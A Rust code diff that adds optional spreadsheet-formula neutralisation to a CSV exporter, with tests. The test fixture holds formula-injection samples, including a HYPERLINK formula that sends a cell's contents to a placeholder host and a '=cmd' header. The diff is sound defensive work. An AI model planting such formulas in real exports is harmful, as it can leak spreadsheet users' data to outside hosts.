@@ -1,6 +1,8 @@
 use crate::ExportError;
 use csv::{Writer, WriterBuilder};
+use dbflux_core::spreadsheet_formula::protect_spreadsheet_formula;
 use dbflux_core::{QueryResult, QueryResultShape, Value};
+use std::borrow::Cow;
 use std::io::Write;
 
 /// The field separator of a CSV document. Semicolon is what spreadsheets in
@@ -31,6 +33,9 @@ impl CsvDelimiter {
 pub struct CsvOptions {
     pub include_header: bool,
     pub delimiter: CsvDelimiter,
+    /// Prefixes `'` to text cells and column names a spreadsheet would run
+    /// as a formula. Off by default, so an export stays byte-exact.
+    pub protect_formulas: bool,
 }
 
 impl Default for CsvOptions {
@@ -38,6 +43,7 @@ impl Default for CsvOptions {
         Self {
             include_header: true,
             delimiter: CsvDelimiter::Comma,
+            protect_formulas: false,
         }
     }
 }
@@ -47,6 +53,32 @@ impl CsvOptions {
         WriterBuilder::new()
             .delimiter(self.delimiter.byte())
             .from_writer(writer)
+    }
+
+    /// A column name as the header row writes it.
+    pub(crate) fn header_field<'a>(&self, name: &'a str) -> Cow<'a, str> {
+        if self.protect_formulas {
+            protect_spreadsheet_formula(name)
+        } else {
+            Cow::Borrowed(name)
+        }
+    }
+
+    /// A value as one field writes it, before quoting.
+    pub(crate) fn field(&self, value: &Value) -> String {
+        let field = value_to_csv_field(value);
+        let is_text = matches!(
+            value,
+            Value::Text(_) | Value::Json(_) | Value::ObjectId(_) | Value::Unsupported(_)
+        );
+
+        // Numbers stay as they are: `-5` is a value, not a formula, and a
+        // quote would turn it into text.
+        if self.protect_formulas && is_text {
+            protect_spreadsheet_formula(&field).into_owned()
+        } else {
+            field
+        }
     }
 }
 
@@ -82,13 +114,17 @@ impl CsvExporter {
         let mut csv_writer = options.writer(writer);
 
         if options.include_header {
-            let headers: Vec<&str> = result.columns.iter().map(|c| c.name.as_str()).collect();
-            csv_writer.write_record(&headers)?;
+            let headers: Vec<Cow<'_, str>> = result
+                .columns
+                .iter()
+                .map(|c| options.header_field(&c.name))
+                .collect();
+            csv_writer.write_record(headers.iter().map(|header| header.as_ref()))?;
         }
 
         for row in &result.rows {
             for value in row.iter() {
-                let field = value_to_csv_field(value);
+                let field = options.field(value);
                 csv_writer.write_field(&field)?;
             }
             csv_writer.write_record(None::<&[u8]>)?;
@@ -153,6 +189,52 @@ mod tests {
             None,
             Duration::from_millis(10),
         )
+    }
+
+    fn formula_result() -> QueryResult {
+        make_result(
+            vec!["=cmd", "n"],
+            vec![
+                vec![
+                    Value::Text("=HYPERLINK(\"https://example.invalid/?\"&A1)".to_string()),
+                    Value::Int(-5),
+                ],
+                vec![Value::Text("@SUM(A1)".to_string()), Value::Float(-1.5)],
+                vec![
+                    Value::Text("plain".to_string()),
+                    Value::Decimal("-2.50".to_string()),
+                ],
+            ],
+        )
+    }
+
+    #[test]
+    fn formulas_are_neutralized_when_asked() {
+        let options = CsvOptions {
+            protect_formulas: true,
+            ..CsvOptions::default()
+        };
+        let mut buf = Vec::new();
+        CsvExporter
+            .export_with_options(&formula_result(), options, &mut buf)
+            .unwrap();
+
+        let output = String::from_utf8(buf).unwrap();
+        assert_eq!(
+            output,
+            "'=cmd,n\n\"'=HYPERLINK(\"\"https://example.invalid/?\"\"&A1)\",-5\n'@SUM(A1),-1.5\nplain,-2.50\n"
+        );
+    }
+
+    #[test]
+    fn formulas_are_written_as_they_are_by_default() {
+        let mut buf = Vec::new();
+        CsvExporter.export(&formula_result(), &mut buf).unwrap();
+
+        let output = String::from_utf8(buf).unwrap();
+        assert!(output.starts_with("=cmd,n\n"));
+        assert!(output.contains("\"=HYPERLINK("));
+        assert!(output.contains("\n@SUM(A1),-1.5\n"));
     }
 
     #[test]
